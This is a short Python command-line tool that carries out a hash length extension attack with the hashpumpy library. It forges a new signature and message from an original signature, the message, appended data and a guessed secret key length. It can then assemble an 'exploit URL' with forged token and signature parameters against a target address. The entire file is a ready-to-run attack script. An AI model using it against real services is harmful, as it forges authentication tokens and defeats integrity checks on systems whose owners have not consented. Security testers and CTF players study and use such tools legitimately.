#!/usr/bin/env python3

import argparse
import urllib.parse
import hashpumpy


def banner():
    print("=" * 60)
    print("        Hash Length Extension Attack")
    print("=" * 60)


def main():
    parser = argparse.ArgumentParser(
        description="Perform a Hash Length Extension Attack using hashpumpy."
    )

    parser.add_argument(
        "-s", "--signature",
        required=True,
        help="Original signature/hash."
    )

    parser.add_argument(
        "-d", "--data",
        required=True,
        help="Original signed message."
    )

    parser.add_argument(
        "-a", "--append",
        required=True,
        help="Data to append to the original message."
    )

    parser.add_argument(
        "-k", "--key-length",
        required=True,
        type=int,
        help="Estimated secret key length (bytes)."
    )

    parser.add_argument(
        "-u", "--url",
        help="Base target URL (optional)."
    )

    parser.add_argument(
        "--token-param",
        default="token",
        help="Token parameter name (default: token)."
    )

    parser.add_argument(
        "--sig-param",
        default="sig",
        help="Signature parameter name (default: sig)."
    )

    parser.add_argument(
        "--encoding",
        default="latin-1",
        help="Encoding used to decode the forged message (default: latin-1)."
    )

    args = parser.parse_args()

    banner()

    print("[*] Performing Length Extension Attack...\n")

    # Perform the attack
    new_sig, new_data = hashpumpy.hashpump(
        args.signature,
        args.data,
        args.append,
        args.key_length
    )

    # URL encode forged message
    encoded_token = urllib.parse.quote(
        new_data.decode(args.encoding)
    )

    print("[+] Original Signature")
    print(args.signature)

    print("\n[+] Original Message")
    print(args.data)

    print("\n[+] Appended Payload")
    print(args.append)

    print("\n" + "-" * 60)

    print("\n[+] Forged Signature")
    print(new_sig)

    print("\n[+] Forged Message")
    print(new_data.decode(args.encoding))

    print("\n[+] URL Encoded Message")
    print(encoded_token)

    # Generate exploit URL if requested
    if args.url:
        separator = "&" if "?" in args.url else "?"

        exploit_url = (
            f"{args.url}"
            f"{separator}"
            f"{args.token_param}={encoded_token}"
            f"&{args.sig_param}={new_sig}"
        )

        print("\n[+] Exploit URL")
        print(exploit_url)


if __name__ == "__main__":
    main()
